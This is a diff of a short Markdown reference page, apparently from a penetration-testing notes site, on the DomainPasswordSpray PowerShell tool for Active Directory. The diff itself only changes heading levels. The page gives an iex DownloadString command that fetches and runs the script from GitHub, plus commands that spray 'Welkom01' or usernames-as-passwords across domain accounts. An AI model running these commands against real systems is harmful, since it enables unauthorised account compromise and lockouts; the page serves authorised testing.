@@ -15,13 +15,13 @@ Powershell script to perform password spray attack in Active Directory.
 
 {{%attachments title="Related files" fa_icon_class="far fa-file" pattern=".*(ps1)"/%}}
 
-### Installation
+## Installation
 
 ```plain
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/crypt0rr/DomainPasswordSpray/master/DomainPasswordSpray.ps1")
 ```
 
-### Usage
+## Usage
 
 ```plain
 Invoke-DomainPasswordSpray -Password Welkom01 -OutFile c:\temp\spray-results.txt
@@ -33,6 +33,6 @@ It can also be interesting to use the `-UsernameAsPassword` flag.
 Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile c:\temp\spray-results.txt
 ```
 
-### URL list
+## URL List
 
 * [Github.com - DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
